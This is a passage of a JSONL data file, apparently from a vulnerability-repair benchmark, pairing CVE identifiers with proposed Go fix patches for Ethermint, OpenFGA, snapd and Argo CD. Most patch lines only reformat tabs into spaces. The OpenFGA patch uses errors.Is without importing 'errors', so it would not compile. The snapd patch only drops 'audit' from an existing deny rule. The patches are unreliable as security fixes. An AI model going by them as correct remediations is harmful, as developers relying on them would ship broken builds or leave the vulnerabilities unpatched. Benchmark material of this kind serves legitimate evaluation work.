k.accountKeeper.GetAccount(ctx, cosmosAddr)\n-\tif acct == nil {\n-\t\tacct = k.accountKeeper.NewAccountWithAddress(ctx, cosmosAddr)\n-\t}\n-\n-\tif err := acct.SetSequence(account.Nonce); err != nil {\n-\t\treturn err\n-\t}\n-\n-\tcodeHash := common.BytesToHash(account.CodeHash)\n-\n-\tif ethAcct, ok := acct.(ethermint.EthAccountI); ok {\n-\t\tif err := ethAcct.SetCodeHash(codeHash); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\tk.accountKeeper.SetAccount(ctx, acct)\n-\n-\tif err := k.SetBalance(ctx, addr, account.Balance); err != nil {\n-\t\treturn err\n-\t}\n-\n-\tk.Logger(ctx).Debug(\n-\t\t\"account updated\",\n-\t\t\"ethereum-address\", addr.Hex(),\n-\t\t\"nonce\", account.Nonce,\n-\t\t\"codeHash\", codeHash.Hex(),\n-\t\t\"balance\", account.Balance,\n-\t)\n-\treturn nil\n+        // update account\n+        cosmosAddr := sdk.AccAddress(addr.Bytes())\n+        acct := k.accountKeeper.GetAccount(ctx, cosmosAddr)\n+        if acct == nil {\n+                acct = k.accountKeeper.NewAccountWithAddress(ctx, cosmosAddr)\n+        }\n+\n+        if err := acct.SetSequence(account.Nonce); err != nil {\n+                return err\n+        }\n+\n+        codeHash := common.BytesToHash(account.CodeHash)\n+\n+        if ethAcct, ok := acct.(ethermint.EthAccountI); ok {\n+                if err := ethAcct.SetCodeHash(codeHash); err != nil {\n+                        return err\n+                }\n+        }\n+\n+        k.accountKeeper.SetAccount(ctx, acct)\n+\n+        if err := k.SetBalance(ctx, addr, account.Balance); err != nil {\n+                return err\n+        }\n+\n+        k.Logger(ctx).Debug(\n+                \"account updated\",\n+                \"ethereum-address\", addr.Hex(),\n+                \"nonce\", account.Nonce,\n+                \"codeHash\", codeHash.Hex(),\n+                \"balance\", account.Balance,\n+        )\n+        return nil\n }\n \n // SetState update contract storage, delete if value is empty.\n func (k *Keeper) SetState(ctx sdk.Context, addr common.Address, key common.Hash, value []byte) {\n-\tstore := prefix.NewStore(ctx.KVStore(k.storeKey), types.AddressStoragePrefix(addr))\n-\taction := \"updated\"\n-\tif len(value) == 0 {\n-\t\tstore.Delete(key.Bytes())\n-\t\taction = \"deleted\"\n-\t} else {\n-\t\tstore.Set(key.Bytes(), value)\n-\t}\n-\tk.Logger(ctx).Debug(\n-\t\tfmt.Sprintf(\"state %s\", action),\n-\t\t\"ethereum-address\", addr.Hex(),\n-\t\t\"key\", key.Hex(),\n-\t)\n+        store := prefix.NewStore(ctx.KVStore(k.storeKey), types.AddressStoragePrefix(addr))\n+        action := \"updated\"\n+        if len(value) == 0 {\n+                store.Delete(key.Bytes())\n+                action = \"deleted\"\n+        } else {\n+                store.Set(key.Bytes(), value)\n+        }\n+        k.Logger(ctx).Debug(\n+                fmt.Sprintf(\"state %s\", action),\n+                \"ethereum-address\", addr.Hex(),\n+                \"key\", key.Hex(),\n+        )\n }\n \n // SetCode set contract code, delete if code is empty.\n func (k *Keeper) SetCode(ctx sdk.Context, codeHash, code []byte) {\n-\tstore := prefix.NewStore(ctx.KVStore(k.storeKey), types.KeyPrefixCode)\n-\n-\t// store or delete code\n-\taction := \"updated\"\n-\tif len(code) == 0 {\n-\t\tstore.Delete(codeHash)\n-\t\taction = \"deleted\"\n-\t} else {\n-\t\tstore.Set(codeHash, code)\n-\t}\n-\tk.Logger(ctx).Debug(\n-\t\tfmt.Sprintf(\"code %s\", action),\n-\t\t\"code-hash\", common.BytesToHash(codeHash).Hex(),\n-\t)\n+        store := prefix.NewStore(ctx.KVStore(k.storeKey), types.KeyPrefixCode)\n+\n+        // store or delete code\n+        action := \"updated\"\n+        if len(code) == 0 {\n+                store.Delete(codeHash)\n+                action = \"deleted\"\n+        } else {\n+                store.Set(codeHash, code)\n+        }\n+        k.Logger(ctx).Debug(\n+                fmt.Sprintf(\"code %s\", action),\n+                \"code-hash\", common.BytesToHash(codeHash).Hex(),\n+        )\n }\n \n // DeleteAccount handles contract's suicide call:\n@@ -179,43 +213,43 @@ func (k *Keeper) SetCode(ctx sdk.Context, codeHash, code []byte) {\n // - remove states\n // - remove auth account\n func (k *Keeper) DeleteAccount(ctx sdk.Context, addr common.Address) error {\n-\tcosmosAddr := sdk.AccAddress(addr.Bytes())\n-\tacct := k.accountKeeper.GetAccount(ctx, cosmosAddr)\n-\tif acct == nil {\n-\t\treturn nil\n-\t}\n-\n-\t// NOTE: only Ethereum accounts (contracts) can be selfdestructed\n-\tethAcct, ok := acct.(ethermint.EthAccountI)\n-\tif !ok {\n-\t\treturn sdkerrors.Wrapf(types.ErrInvalidAccount, \"type %T, address %s\", acct, addr)\n-\t}\n-\n-\t// clear balance\n-\tif err := k.SetBalance(ctx, addr, new(big.Int)); err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// remove code\n-\tcodeHashBz := ethAcct.GetCodeHash().Bytes()\n-\tif !bytes.Equal(codeHashBz, types.EmptyCodeHash) {\n-\t\tk.SetCode(ctx, codeHashBz, nil)\n-\t}\n-\n-\t// clear storage\n-\tk.ForEachStorage(ctx, addr, func(key, _ common.Hash) bool {\n-\t\tk.SetState(ctx, addr, key, nil)\n-\t\treturn true\n-\t})\n-\n-\t// remove auth account\n-\tk.accountKeeper.RemoveAccount(ctx, acct)\n-\n-\tk.Logger(ctx).Debug(\n-\t\t\"account suicided\",\n-\t\t\"ethereum-address\", addr.Hex(),\n-\t\t\"cosmos-address\", cosmosAddr.String(),\n-\t)\n-\n-\treturn nil\n+        cosmosAddr := sdk.AccAddress(addr.Bytes())\n+        acct := k.accountKeeper.GetAccount(ctx, cosmosAddr)\n+        if acct == nil {\n+                return nil\n+        }\n+\n+        // NOTE: only Ethereum accounts (contracts) can be selfdestructed\n+        ethAcct, ok := acct.(ethermint.EthAccountI)\n+        if !ok {\n+                return sdkerrors.Wrapf(types.ErrInvalidAccount, \"type %T, address %s\", acct, addr)\n+        }\n+\n+        // clear balance\n+        if err := k.SetBalance(ctx, addr, new(big.Int)); err != nil {\n+                return err\n+        }\n+\n+        // remove code\n+        codeHashBz := ethAcct.GetCodeHash().Bytes()\n+        if !bytes.Equal(codeHashBz, types.EmptyCodeHash) {\n+                k.SetCode(ctx, codeHashBz, nil)\n+        }\n+\n+        // clear storage\n+        k.ForEachStorage(ctx, addr, func(key, _ common.Hash) bool {\n+                k.SetState(ctx, addr, key, nil)\n+                return true\n+        })\n+\n+        // remove auth account\n+        k.accountKeeper.RemoveAccount(ctx, acct)\n+\n+        k.Logger(ctx).Debug(\n+                \"account suicided\",\n+                \"ethereum-address\", addr.Hex(),\n+                \"cosmos-address\", cosmosAddr.String(),\n+        )\n+\n+        return nil\n }\n"}
{"cve":"CVE-2022-23542:0708", "fix_patch": "diff --git a/server/commands/check_utils.go b/server/commands/check_utils.go\nindex 2b1651e4..031d8dfd 100644\n--- a/server/commands/check_utils.go\n+++ b/server/commands/check_utils.go\n@@ -1,77 +1,77 @@\n package commands\n \n import (\n-\t\"context\"\n-\t\"fmt\"\n-\t\"sync\"\n-\n-\t\"github.com/openfga/openfga/internal/contextualtuples\"\n-\t\"github.com/openfga/openfga/internal/utils\"\n-\t\"github.com/openfga/openfga/internal/validation\"\n-\ttupleUtils \"github.com/openfga/openfga/pkg/tuple\"\n-\t\"github.com/openfga/openfga/storage\"\n-\topenfgapb \"go.buf.build/openfga/go/openfga/api/openfga/v1\"\n+        \"context\"\n+        \"fmt\"\n+        \"sync\"\n+\n+        \"github.com/openfga/openfga/internal/contextualtuples\"\n+        \"github.com/openfga/openfga/internal/utils\"\n+        \"github.com/openfga/openfga/internal/validation\"\n+        tupleUtils \"github.com/openfga/openfga/pkg/tuple\"\n+        \"github.com/openfga/openfga/storage\"\n+        openfgapb \"go.buf.build/openfga/go/openfga/api/openfga/v1\"\n )\n \n // Keeping the interface simple for the time being\n // we could make it Append* where * are tupleset, computedset, etc.\n // especially if we want to generate other representations for the trace (e.g. a tree)\n type resolutionTracer interface {\n-\tAppendComputed() resolutionTracer\n-\tAppendDirect() resolutionTracer\n-\tAppendIndex(i int) resolutionTracer\n-\tAppendIntersection(t intersectionTracer) resolutionTracer\n-\tAppendString(s string) resolutionTracer\n-\tAppendTupleToUserset() resolutionTracer\n-\tAppendUnion() resolutionTracer\n-\tCreateIntersectionTracer() intersectionTracer\n-\tGetResolution() string\n+        AppendComputed() resolutionTracer\n+        AppendDirect() resolutionTracer\n+        AppendIndex(i int) resolutionTracer\n+        AppendIntersection(t intersectionTracer) resolutionTracer\n+        AppendString(s string) resolutionTracer\n+        AppendTupleToUserset() resolutionTracer\n+        AppendUnion() resolutionTracer\n+        CreateIntersectionTracer() intersectionTracer\n+        GetResolution() string\n }\n \n type intersectionTracer interface {\n-\tAppendTrace(rt resolutionTracer)\n-\tGetResolution() string\n+        AppendTrace(rt resolutionTracer)\n+        GetResolution() string\n }\n \n // noopResolutionTracer is thread safe as current implementation is immutable\n type noopResolutionTracer struct{}\n \n func (t *noopResolutionTracer) AppendComputed() resolutionTracer {\n-\treturn t\n+        return t\n }\n \n func (t *noopResolutionTracer) AppendDirect() resolutionTracer {\n-\treturn t\n+        return t\n }\n \n func (t *noopResolutionTracer) AppendIndex(_ int) resolutionTracer {\n-\treturn t\n+        return t\n }\n \n func (t *noopResolutionTracer) AppendIntersection(_ intersectionTracer) resolutionTracer {\n-\treturn t\n+        return t\n }\n \n func (t *noopResolutionTracer) AppendString(_ string) resolutionTracer {\n-\treturn t\n+        return t\n }\n \n func (t *noopResolutionTracer) AppendTupleToUserset() resolutionTracer {\n-\treturn t\n+        return t\n }\n \n func (t *noopResolutionTracer) AppendUnion() resolutionTracer {\n-\treturn t\n+        return t\n }\n \n var nit = &noopIntersectionTracer{}\n \n func (t *noopResolutionTracer) CreateIntersectionTracer() intersectionTracer {\n-\treturn nit\n+        return nit\n }\n \n func (t *noopResolutionTracer) GetResolution() string {\n-\treturn \"\"\n+        return \"\"\n }\n \n type noopIntersectionTracer struct{}\n@@ -79,303 +79,311 @@ type noopIntersectionTracer struct{}\n func (t *noopIntersectionTracer) AppendTrace(_ resolutionTracer) {}\n \n func (t *noopIntersectionTracer) GetResolution() string {\n-\treturn \"\"\n+        return \"\"\n }\n \n // stringResolutionTracer is thread safe as current implementation is immutable\n type stringResolutionTracer struct {\n-\ttrace string\n+        trace string\n }\n \n func newStringResolutionTracer() resolutionTracer {\n-\treturn &stringResolutionTracer{\n-\t\ttrace: \".\",\n-\t}\n+        return &stringResolutionTracer{\n+                trace: \".\",\n+        }\n }\n \n func (t *stringResolutionTracer) AppendComputed() resolutionTracer {\n-\treturn t.AppendString(\"(computed-userset)\")\n+        return t.AppendString(\"(computed-userset)\")\n }\n \n func (t *stringResolutionTracer) AppendDirect() resolutionTracer {\n-\treturn t.AppendString(\"(direct)\")\n+        return t.AppendString(\"(direct)\")\n }\n \n // AppendIndex We create separate append functions so no casting happens externally\n // This aim to minimize overhead added by the no-op implementation\n func (t *stringResolutionTracer) AppendIndex(n int) resolutionTracer {\n-\treturn &stringResolutionTracer{\n-\t\ttrace: fmt.Sprintf(\"%s%d\", t.trace, n),\n-\t}\n+        return &stringResolutionTracer{\n+                trace: fmt.Sprintf(\"%s%d\", t.trace, n),\n+        }\n }\n \n func (t *stringResolutionTracer) AppendIntersection(it intersectionTracer) resolutionTracer {\n-\treturn &stringResolutionTracer{\n-\t\ttrace: fmt.Sprintf(\"%s[%s]\", t.trace, it.GetResolution()),\n-\t}\n+        return &stringResolutionTracer{\n+                trace: fmt.Sprintf(\"%s[%s]\", t.trace, it.GetResolution()),\n+        }\n }\n \n func (t *stringResolutionTracer) AppendString(subTrace string) resolutionTracer {\n-\treturn &stringResolutionTracer{\n-\t\ttrace: fmt.Sprintf(\"%s%s.\", t.trace, subTrace),\n-\t}\n+        return &stringResolutionTracer{\n+                trace: fmt.Sprintf(\"%s%s.\", t.trace, subTrace),\n+        }\n }\n \n func (t *stringResolutionTracer) AppendTupleToUserset() resolutionTracer {\n-\treturn t.AppendString(\"(tuple-to-userset)\")\n+        return t.AppendString(\"(tuple-to-userset)\")\n }\n \n func (t *stringResolutionTracer) AppendUnion() resolutionTracer {\n-\treturn t.AppendString(\"union\")\n+        return t.AppendString(\"union\")\n }\n \n func (t *stringResolutionTracer) CreateIntersectionTracer() intersectionTracer {\n-\treturn &stringIntersectionTracer{}\n+        return &stringIntersectionTracer{}\n }\n \n func (t *stringResolutionTracer) GetResolution() string {\n-\treturn t.trace\n+        return t.trace\n }\n \n // stringIntersectionTracer is NOT thread safe. do not call from multiple threads\n type stringIntersectionTracer struct {\n-\ttrace string\n+        trace string\n }\n \n func (t *stringIntersectionTracer) AppendTrace(rt resolutionTracer) {\n-\tif len(t.trace) != 0 {\n-\t\tt.trace = fmt.Sprintf(\"%s,%s\", t.trace, rt.GetResolution())\n-\t\treturn\n-\t}\n+        if len(t.trace) != 0 {\n+                t.trace = fmt.Sprintf(\"%s,%s\", t.trace, rt.GetResolution())\n+                return\n+        }\n \n-\tt.trace = rt.GetResolution()\n+        t.trace = rt.GetResolution()\n }\n \n func (t *stringIntersectionTracer) GetResolution() string {\n-\treturn t.trace\n+        return t.trace\n }\n \n type userSet struct {\n-\tm sync.Mutex\n-\tu map[string]resolutionTracer\n+        m sync.Mutex\n+        u map[string]resolutionTracer\n }\n \n type userWithTracer struct {\n-\tu string\n-\tr resolutionTracer\n+        u string\n+        r resolutionTracer\n }\n \n func (u *userSet) Add(r resolutionTracer, values ...string) {\n-\tu.m.Lock()\n-\tfor _, v := range values {\n-\t\tu.u[v] = r\n-\t}\n-\tu.m.Unlock()\n+        u.m.Lock()\n+        for _, v := range values {\n+                u.u[v] = r\n+        }\n+        u.m.Unlock()\n }\n \n func (u *userSet) AddFrom(other *userSet) {\n-\tu.m.Lock()\n-\tfor _, uwr := range other.AsSlice() {\n-\t\tu.u[uwr.u] = uwr.r\n-\t}\n-\tu.m.Unlock()\n+        u.m.Lock()\n+        for _, uwr := range other.AsSlice() {\n+                u.u[uwr.u] = uwr.r\n+        }\n+        u.m.Unlock()\n }\n \n func (u *userSet) DeleteFrom(other *userSet) {\n-\tu.m.Lock()\n-\tfor _, uwr := range other.AsSlice() {\n-\t\tdelete(u.u, uwr.u)\n-\t}\n-\tu.m.Unlock()\n+        u.m.Lock()\n+        for _, uwr := range other.AsSlice() {\n+                delete(u.u, uwr.u)\n+        }\n+        u.m.Unlock()\n }\n \n func (u *userSet) Get(value string) (resolutionTracer, bool) {\n-\tu.m.Lock()\n-\tdefer u.m.Unlock()\n+        u.m.Lock()\n+        defer u.m.Unlock()\n \n-\tvar found bool\n-\tvar rt resolutionTracer\n-\tif rt, found = u.u[value]; !found {\n-\t\tif rt, found = u.u[tupleUtils.Wildcard]; !found {\n-\t\t\treturn nil, false\n-\t\t}\n-\t}\n-\treturn rt, found\n+        var found bool\n+        var rt resolutionTracer\n+        if rt, found = u.u[value]; !found {\n+                if rt, found = u.u[tupleUtils.Wildcard]; !found {\n+                        return nil, false\n+                }\n+        }\n+        return rt, found\n }\n \n func (u *userSet) AsSlice() []userWithTracer {\n-\tu.m.Lock()\n-\tout := make([]userWithTracer, 0, len(u.u))\n-\tfor u, rt := range u.u {\n-\t\tout = append(out, userWithTracer{\n-\t\t\tu: u,\n-\t\t\tr: rt,\n-\t\t})\n-\t}\n-\tu.m.Unlock()\n-\treturn out\n+        u.m.Lock()\n+        out := make([]userWithTracer, 0, len(u.u))\n+        for u, rt := range u.u {\n+                out = append(out, userWithTracer{\n+                        u: u,\n+                        r: rt,\n+                })\n+        }\n+        u.m.Unlock()\n+        return out\n }\n \n func newUserSet() *userSet {\n-\treturn &userSet{u: make(map[string]resolutionTracer)}\n+        return &userSet{u: make(map[string]resolutionTracer)}\n }\n \n type userSets struct {\n-\tmu  sync.Mutex\n-\tusm map[int]*userSet\n+        mu  sync.Mutex\n+        usm map[int]*userSet\n }\n \n func newUserSets() *userSets {\n-\treturn &userSets{usm: make(map[int]*userSet, 0)}\n+        return &userSets{usm: make(map[int]*userSet, 0)}\n }\n \n func (u *userSets) Set(idx int, us *userSet) {\n-\tu.mu.Lock()\n-\tu.usm[idx] = us\n-\tu.mu.Unlock()\n+        u.mu.Lock()\n+        u.usm[idx] = us\n+        u.mu.Unlock()\n }\n \n func (u *userSets) Get(idx int) (*userSet, bool) {\n-\tu.mu.Lock()\n-\tus, ok := u.usm[idx]\n-\tu.mu.Unlock()\n-\treturn us, ok\n+        u.mu.Lock()\n+        us, ok := u.usm[idx]\n+        u.mu.Unlock()\n+        return us, ok\n }\n \n func (u *userSets) AsMap() map[int]*userSet {\n-\treturn u.usm\n+        return u.usm\n }\n \n type chanResolveResult struct {\n-\terr   error\n-\tfound bool\n+        err   error\n+        found bool\n }\n \n type circuitBreaker struct {\n-\tmu           sync.Mutex\n-\tbreakerState bool\n+        mu           sync.Mutex\n+        breakerState bool\n }\n \n func (sc *circuitBreaker) Open() {\n-\tsc.mu.Lock()\n-\tdefer sc.mu.Unlock()\n-\tsc.breakerState = true\n+        sc.mu.Lock()\n+        defer sc.mu.Unlock()\n+        sc.breakerState = true\n }\n \n func (sc *circuitBreaker) IsOpen() bool {\n-\tsc.mu.Lock()\n-\tdefer sc.mu.Unlock()\n-\treturn sc.breakerState\n+        sc.mu.Lock()\n+        defer sc.mu.Unlock()\n+        return sc.breakerState\n }\n \n type resolutionContext struct {\n-\tstore            string\n-\tmodel            *openfgapb.AuthorizationModel\n-\tusers            *userSet\n-\ttargetUser       string\n-\ttk               *openfgapb.TupleKey\n-\tcontextualTuples *contextualtuples.ContextualTuples\n-\ttracer           resolutionTracer\n-\tmetadata         *utils.ResolutionMetadata\n-\tinternalCB       *circuitBreaker // Opens if the user is found, controlled internally. Primarily used for UNION.\n-\texternalCB       *circuitBreaker // Open is controlled from caller, Used for Difference and Intersection.\n+        store            string\n+        model            *openfgapb.AuthorizationModel\n+        users            *userSet\n+        targetUser       string\n+        tk               *openfgapb.TupleKey\n+        contextualTuples *contextualtuples.ContextualTuples\n+        tracer           resolutionTracer\n+        metadata         *utils.ResolutionMetadata\n+        internalCB       *circuitBreaker // Opens if the user is found, controlled internally. Primarily used for UNION.\n+        externalCB       *circuitBreaker // Open is controlled from caller, Used for Difference and Intersection.\n }\n \n func newResolutionContext(store string, model *openfgapb.AuthorizationModel, tk *openfgapb.TupleKey, contextualTuples *contextualtuples.ContextualTuples, tracer resolutionTracer, metadata *utils.ResolutionMetadata, externalBreaker *circuitBreaker) *resolutionContext {\n-\treturn &resolutionContext{\n-\t\tstore:            store,\n-\t\tmodel:            model,\n-\t\tusers:            newUserSet(),\n-\t\ttargetUser:       tk.GetUser(),\n-\t\ttk:               tk,\n-\t\tcontextualTuples: contextualTuples,\n-\t\ttracer:           tracer,\n-\t\tmetadata:         metadata,\n-\t\tinternalCB:       &circuitBreaker{breakerState: false},\n-\t\texternalCB:       externalBreaker,\n-\t}\n+        return &resolutionContext{\n+                store:            store,\n+                model:            model,\n+                users:            newUserSet(),\n+                targetUser:       tk.GetUser(),\n+                tk:               tk,\n+                contextualTuples: contextualTuples,\n+                tracer:           tracer,\n+                metadata:         metadata,\n+                internalCB:       &circuitBreaker{breakerState: false},\n+                externalCB:       externalBreaker,\n+        }\n }\n \n func (rc *resolutionContext) shouldShortCircuit() bool {\n-\tif rc.internalCB.IsOpen() || rc.externalCB.IsOpen() {\n-\t\treturn true\n-\t}\n-\treturn rc.userFound()\n+        if rc.internalCB.IsOpen() || rc.externalCB.IsOpen() {\n+                return true\n+        }\n+        return rc.userFound()\n }\n \n func (rc *resolutionContext) shortCircuit() {\n-\trc.internalCB.Open()\n+        rc.internalCB.Open()\n }\n \n func (rc *resolutionContext) userFound() bool {\n-\t_, ok := rc.users.Get(rc.targetUser)\n-\tif ok {\n-\t\trc.shortCircuit()\n-\t}\n-\treturn ok\n+        _, ok := rc.users.Get(rc.targetUser)\n+        if ok {\n+                rc.shortCircuit()\n+        }\n+        return ok\n }\n \n func (rc *resolutionContext) fork(tk *openfgapb.TupleKey, tracer resolutionTracer, resetResolveCounter bool) *resolutionContext {\n-\tmetadata := rc.metadata\n-\tif resetResolveCounter {\n-\t\tmetadata = rc.metadata.Fork()\n-\t}\n-\n-\treturn &resolutionContext{\n-\t\tstore:            rc.store,\n-\t\tmodel:            rc.model,\n-\t\tusers:            rc.users,\n-\t\ttargetUser:       rc.targetUser,\n-\t\ttk:               tk,\n-\t\tcontextualTuples: rc.contextualTuples,\n-\t\ttracer:           tracer,\n-\t\tmetadata:         metadata,\n-\t\tinternalCB:       rc.internalCB,\n-\t\texternalCB:       rc.externalCB,\n-\t}\n+        metadata := rc.metadata\n+        if resetResolveCounter {\n+                metadata = rc.metadata.Fork()\n+        }\n+\n+        return &resolutionContext{\n+                store:            rc.store,\n+                model:            rc.model,\n+                users:            rc.users,\n+                targetUser:       rc.targetUser,\n+                tk:               tk,\n+                contextualTuples: rc.contextualTuples,\n+                tracer:           tracer,\n+                metadata:         metadata,\n+                internalCB:       rc.internalCB,\n+                externalCB:       rc.externalCB,\n+        }\n }\n \n func (rc *resolutionContext) readUserTuple(ctx context.Context, backend storage.TupleBackend) (*openfgapb.TupleKey, error) {\n-\ttk, ok := rc.contextualTuples.ReadUserTuple(rc.tk)\n-\tif ok {\n-\t\treturn tk, nil\n-\t}\n+        tk, ok := rc.contextualTuples.ReadUserTuple(rc.tk)\n+        if ok {\n+                if err := validation.ValidateTuple(rc.model, tk); err != nil {\n+                        return nil, nil // an invalid contextual tuple is not a server error\n+                }\n \n-\ttuple, err := backend.ReadUserTuple(ctx, rc.store, rc.tk)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn tuple.GetKey(), nil\n+                return tk, nil // found it\n+        }\n+\n+        tuple, err := backend.ReadUserTuple(ctx, rc.store, rc.tk)\n+        if err != nil {\n+                if errors.Is(err, storage.ErrNotFound) {\n+                        return nil, nil\n+                }\n+\n+                return nil, err // actual error\n+        }\n+        return tuple.GetKey(), nil // found it\n }\n \n func (rc *resolutionContext) readUsersetTuples(ctx context.Context, backend storage.TupleBackend) (storage.TupleKeyIterator, error) {\n-\tcUsersetTuples := rc.contextualTuples.ReadUsersetTuples(rc.tk)\n-\tusersetTuples, err := backend.ReadUsersetTuples(ctx, rc.store, rc.tk)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n+        cUsersetTuples := rc.contextualTuples.ReadUsersetTuples(rc.tk)\n+        usersetTuples, err := backend.ReadUsersetTuples(ctx, rc.store, rc.tk)\n+        if err != nil {\n+                return nil, err\n+        }\n \n-\titer1 := storage.NewStaticTupleKeyIterator(cUsersetTuples)\n-\titer2 := storage.NewTupleKeyIteratorFromTupleIterator(usersetTuples)\n+        iter1 := storage.NewStaticTupleKeyIterator(cUsersetTuples)\n+        iter2 := storage.NewTupleKeyIteratorFromTupleIterator(usersetTuples)\n \n-\treturn storage.NewFilteredTupleKeyIterator(\n-\t\tstorage.NewCombinedIterator(iter1, iter2),\n-\t\tvalidation.FilterInvalidTuples(rc.model),\n-\t), nil\n+        return storage.NewFilteredTupleKeyIterator(\n+                storage.NewCombinedIterator(iter1, iter2),\n+                validation.FilterInvalidTuples(rc.model),\n+        ), nil\n }\n \n func (rc *resolutionContext) read(ctx context.Context, backend storage.TupleBackend, tk *openfgapb.TupleKey) (storage.TupleKeyIterator, error) {\n-\tcTuples := rc.contextualTuples.Read(tk)\n-\ttuples, err := backend.Read(ctx, rc.store, tk)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\titer1 := storage.NewStaticTupleKeyIterator(cTuples)\n-\titer2 := storage.NewTupleKeyIteratorFromTupleIterator(tuples)\n-\n-\treturn storage.NewFilteredTupleKeyIterator(\n-\t\tstorage.NewCombinedIterator(iter1, iter2),\n-\t\tvalidation.FilterInvalidTuples(rc.model),\n-\t), nil\n+        cTuples := rc.contextualTuples.Read(tk)\n+        tuples, err := backend.Read(ctx, rc.store, tk)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        iter1 := storage.NewStaticTupleKeyIterator(cTuples)\n+        iter2 := storage.NewTupleKeyIteratorFromTupleIterator(tuples)\n+\n+        return storage.NewFilteredTupleKeyIterator(\n+                storage.NewCombinedIterator(iter1, iter2),\n+                validation.FilterInvalidTuples(rc.model),\n+        ), nil\n }\n"}
{"cve":"CVE-2024-1724:0708", "fix_patch": "diff --git a/interfaces/builtin/home.go b/interfaces/builtin/home.go\nindex 998ca254f0..19fbf00477 100644\n--- a/interfaces/builtin/home.go\n+++ b/interfaces/builtin/home.go\n@@ -20,11 +20,11 @@\n package builtin\n \n import (\n-\t\"fmt\"\n+        \"fmt\"\n \n-\t\"github.com/snapcore/snapd/interfaces\"\n-\t\"github.com/snapcore/snapd/interfaces/apparmor\"\n-\t\"github.com/snapcore/snapd/snap\"\n+        \"github.com/snapcore/snapd/interfaces\"\n+        \"github.com/snapcore/snapd/interfaces/apparmor\"\n+        \"github.com/snapcore/snapd/snap\"\n )\n \n const homeSummary = `allows access to non-hidden files in the home directory`\n@@ -78,7 +78,7 @@ owner /run/user/[0-9]*/gvfs/*/**  w,\n \n # Disallow writes to the well-known directory included in\n # the user's PATH on several distributions\n-audit deny @{HOME}/bin/{,**} wl,\n+deny @{HOME}/bin/{,**} wl,\n `\n \n const homeConnectedPlugAppArmorWithAllRead = `\n@@ -94,39 +94,39 @@ capability dac_read_search,\n `\n \n type homeInterface struct {\n-\tcommonInterface\n+        commonInterface\n }\n \n func (iface *homeInterface) BeforePreparePlug(plug *snap.PlugInfo) error {\n-\t// It's fine if 'read' isn't specified, but if it is, it needs to be\n-\t// 'all'\n-\tif r, ok := plug.Attrs[\"read\"]; ok && r != \"all\" {\n-\t\treturn fmt.Errorf(`home plug requires \"read\" be 'all'`)\n-\t}\n+        // It's fine if 'read' isn't specified, but if it is, it needs to be\n+        // 'all'\n+        if r, ok := plug.Attrs[\"read\"]; ok && r != \"all\" {\n+                return fmt.Errorf(`home plug requires \"read\" be 'all'`)\n+        }\n \n-\treturn nil\n+        return nil\n }\n \n func (iface *homeInterface) AppArmorConnectedPlug(spec *apparmor.Specification, plug *interfaces.ConnectedPlug, slot *interfaces.ConnectedSlot) error {\n-\tvar read string\n-\t_ = plug.Attr(\"read\", &read)\n-\t// 'owner' is the standard policy\n-\tspec.AddSnippet(homeConnectedPlugAppArmor)\n-\n-\t// 'all' grants standard policy plus read access to home without owner\n-\t// match\n-\tif read == \"all\" {\n-\t\tspec.AddSnippet(homeConnectedPlugAppArmorWithAllRead)\n-\t}\n-\treturn nil\n+        var read string\n+        _ = plug.Attr(\"read\", &read)\n+        // 'owner' is the standard policy\n+        spec.AddSnippet(homeConnectedPlugAppArmor)\n+\n+        // 'all' grants standard policy plus read access to home without owner\n+        // match\n+        if read == \"all\" {\n+                spec.AddSnippet(homeConnectedPlugAppArmorWithAllRead)\n+        }\n+        return nil\n }\n \n func init() {\n-\tregisterIface(&homeInterface{commonInterface{\n-\t\tname:                 \"home\",\n-\t\tsummary:              homeSummary,\n-\t\timplicitOnCore:       true,\n-\t\timplicitOnClassic:    true,\n-\t\tbaseDeclarationSlots: homeBaseDeclarationSlots,\n-\t}})\n+        registerIface(&homeInterface{commonInterface{\n+                name:                 \"home\",\n+                summary:              homeSummary,\n+                implicitOnCore:       true,\n+                implicitOnClassic:    true,\n+                baseDeclarationSlots: homeBaseDeclarationSlots,\n+        }})\n }\n"}
{"cve":"CVE-2023-22736:0708", "fix_patch": "diff --git a/controller/appcontroller.go b/controller/appcontroller.go\nindex a989c5a16..55b704ab1 100644\n--- a/controller/appcontroller.go\n+++ b/controller/appcontroller.go\n@@ -1,1472 +1,1472 @@\n package controller\n \n import (\n-\t\"context\"\n-\t\"encoding/json\"\n-\t\"fmt\"\n-\t\"math\"\n-\t\"net/http\"\n-\t\"reflect\"\n-\t\"runtime/debug\"\n-\t\"sort\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"sync\"\n-\t\"time\"\n-\n-\tclustercache \"github.com/argoproj/gitops-engine/pkg/cache\"\n-\t\"github.com/argoproj/gitops-engine/pkg/diff\"\n-\t\"github.com/argoproj/gitops-engine/pkg/health\"\n-\tsynccommon \"github.com/argoproj/gitops-engine/pkg/sync/common\"\n-\t\"github.com/argoproj/gitops-engine/pkg/utils/kube\"\n-\tjsonpatch \"github.com/evanphx/json-patch\"\n-\tlog \"github.com/sirupsen/logrus\"\n-\t\"golang.org/x/sync/semaphore\"\n-\tv1 \"k8s.io/api/core/v1\"\n-\tapierr \"k8s.io/apimachinery/pkg/api/errors\"\n-\tmetav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\"\n-\t\"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured\"\n-\t\"k8s.io/apimachinery/pkg/labels\"\n-\tapiruntime \"k8s.io/apimachinery/pkg/runtime\"\n-\t\"k8s.io/apimachinery/pkg/runtime/schema\"\n-\t\"k8s.io/apimachinery/pkg/types\"\n-\t\"k8s.io/apimachinery/pkg/util/runtime\"\n-\t\"k8s.io/apimachinery/pkg/util/wait\"\n-\t\"k8s.io/apimachinery/pkg/watch\"\n-\t\"k8s.io/client-go/kubernetes\"\n-\t\"k8s.io/client-go/tools/cache\"\n-\t\"k8s.io/client-go/util/workqueue\"\n-\n-\tstatecache \"github.com/argoproj/argo-cd/v2/controller/cache\"\n-\t\"github.com/argoproj/argo-cd/v2/controller/metrics\"\n-\t\"github.com/argoproj/argo-cd/v2/pkg/apis/application\"\n-\tappv1 \"github.com/argoproj/argo-cd/v2/pkg/apis/application/v1alpha1\"\n-\tappclientset 